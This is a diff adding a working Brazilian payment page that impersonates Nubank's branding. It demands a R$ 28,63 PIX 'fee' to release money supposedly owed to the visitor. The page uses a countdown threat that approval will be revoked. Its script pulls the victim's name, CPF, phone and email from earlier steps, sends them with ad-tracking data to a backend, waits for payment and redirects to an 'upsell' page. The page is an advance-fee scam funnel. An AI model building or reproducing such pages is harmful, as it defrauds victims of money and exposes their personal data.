@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagamento - Liberação do valor</title>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+<script>window.pixelId="6ab288dd71f78d2372b346ad";</script>
+<script async defer src="https://cdn.utmify.com.br/scripts/pixel/pixel.js"></script>
+<script src="/pixel.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#f4f0f7;color:#222}
+.top{background:#820ad1;color:#fff;padding:16px;text-align:center;font-weight:800;font-size:22px;letter-spacing:-1px}
+.wrap{max-width:440px;margin:0 auto;padding:18px}
+.card{background:#fff;border-radius:18px;padding:22px;box-shadow:0 4px 18px rgba(130,10,209,.12);text-align:center}
+h1{font-size:19px;margin-bottom:6px}
+.valor{font-size:30px;font-weight:800;color:#820ad1;margin:6px 0 14px}
+.sub{font-size:14px;color:#555;margin-bottom:16px}
+#qr{width:230px;height:230px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;border:2px dashed #d9c2ec;border-radius:12px;color:#888;font-size:14px}
+#qr img{width:220px;height:220px}
+textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-size:12px;font-family:monospace;word-break:break-all;resize:none}
+.btn{width:100%;margin-top:12px;padding:15px;background:#820ad1;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer}
+.timer{margin-top:18px;background:#f4ecfa;border-radius:12px;padding:12px}
+.timer b{display:block;font-size:32px;color:#820ad1}
+#status{margin-top:14px;font-size:14px;color:#820ad1;font-weight:600}
+.steps{text-align:left;font-size:13px;color:#555;margin-top:16px;line-height:1.7}
+</style>
+</head>
+<body>
+<div class="top">nu</div>
+<div class="wrap"><div class="card">
+<h1>Pague a taxa para liberar seu valor</h1>
+<div class="valor">R$ 28,63</div>
+<p class="sub">Escaneie o QR Code ou copie o código PIX abaixo</p>
+<div id="qr">Gerando PIX...</div>
+<textarea id="code" rows="4" readonly placeholder="Gerando código..."></textarea>
+<button class="btn" id="copy" type="button">COPIAR CÓDIGO PIX</button>
+<div class="timer"><span style="font-size:13px;color:#555">Tempo restante para pagar:</span><b id="cd">05:00</b><span style="font-size:12px;color:#777">Após esse tempo, sua aprovação pode ser revogada</span></div>
+<p id="status"></p>
+<div class="steps">1. Abra o app do seu banco<br>2. Escolha pagar com PIX copia e cola ou QR Code<br>3. Confirme o pagamento — a liberação é automática</div>
+</div></div>
+<script>
+(function(){
+  var ls=function(k){try{return localStorage.getItem(k)||""}catch(e){return""}};
+  var qs=new URLSearchParams(location.search);
+  var utms={};['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(function(k){var v=ls(k)||qs.get(k);if(v)utms[k]=v;});
+  var st=document.getElementById('status');
+  // contagem regressiva
+  var t=300,cd=document.getElementById('cd');
+  setInterval(function(){if(t>0)t--;cd.textContent=String(Math.floor(t/60)).padStart(2,'0')+':'+String(t%60).padStart(2,'0');},1000);
+  document.getElementById('copy').onclick=function(){
+    var ta=document.getElementById('code');if(!ta.value)return;ta.select();
+    (navigator.clipboard?navigator.clipboard.writeText(ta.value):Promise.reject()).catch(function(){document.execCommand('copy')}).finally(function(){
+      var b=document.getElementById('copy');b.textContent='CÓDIGO COPIADO!';setTimeout(function(){b.textContent='COPIAR CÓDIGO PIX'},2000);});
+  };
+  function next(){
+    var p=[];var nome=ls('nomeUsuario')||ls('name')||ls('nome');var cpf=(ls('cpfUsuario')||ls('cpf')||ls('document')).replace(/\D/g,'');var tel=(ls('telephone')||ls('phone')).replace(/\D/g,'');
+    p.push('nome='+encodeURIComponent(nome),'cpf='+cpf,'telephone='+tel);
+    Object.keys(utms).forEach(function(k){p.push(k+'='+encodeURIComponent(utms[k]))});
+    location.href='../upsell/01/?'+p.join('&');
+  }
+  function poll(id){
+    st.textContent='Aguardando pagamento...';
+    var iv=setInterval(function(){
+      fetch('/api/check_status/?txid='+encodeURIComponent(id)).then(function(r){return r.json()}).then(function(d){
+        if(d.paid){clearInterval(iv);st.textContent='Pagamento confirmado! Redirecionando...';st.style.color='green';setTimeout(next,2000);}
+      }).catch(function(){});
+    },4000);
+  }
+  function gerar(){
+    var saved=null;try{saved=JSON.parse(sessionStorage.getItem('pix_pag04')||'null')}catch(e){}
+    if(saved&&saved.qr&&Date.now()-saved.at<25*60*1000){show(saved.qr,saved.id);return;}
+    fetch('/api/backend/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({
+      amount:'28,63',nome:ls('nomeUsuario')||ls('name')||ls('nome'),cpf:(ls('cpfUsuario')||ls('cpf')||ls('document')).replace(/\D/g,''),
+      telefone:(ls('telephone')||ls('phone')).replace(/\D/g,''),email:ls('email'),stage:'avaliacao04'},utms))})
+    .then(function(r){return r.json().then(function(d){return{ok:r.ok,d:d}})}).then(function(x){
+      var d=x.d;var qr=d.qr_code||d.qrcode||(d.pix&&d.pix.qrcode)||(d.data&&d.data.pix&&d.data.pix.qr_code);var id=d.txid||d.id||(d.data&&d.data.id);
+      if(!x.ok||!qr)throw new Error('falha');
+      try{sessionStorage.setItem('pix_pag04',JSON.stringify({qr:qr,id:id,at:Date.now()}))}catch(e){}
+      show(qr,id);
+    }).catch(function(){document.getElementById('qr').innerHTML='<button class="btn" id="retry" type="button">Tentar de novo</button>';st.textContent='Não foi possível gerar o PIX.';st.style.color='red';document.getElementById('retry').onclick=function(){document.getElementById('qr').textContent='Gerando PIX...';st.textContent='';st.style.color='';gerar();};});
+  }
+  function show(qr,id){
+    document.getElementById('qr').innerHTML='<img alt="QR Code PIX" src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(qr)+'">';
+    document.getElementById('code').value=qr;
+    if(id)poll(id);
+  }
+  gerar();
+})();
+</script>
+</body>
+</html>
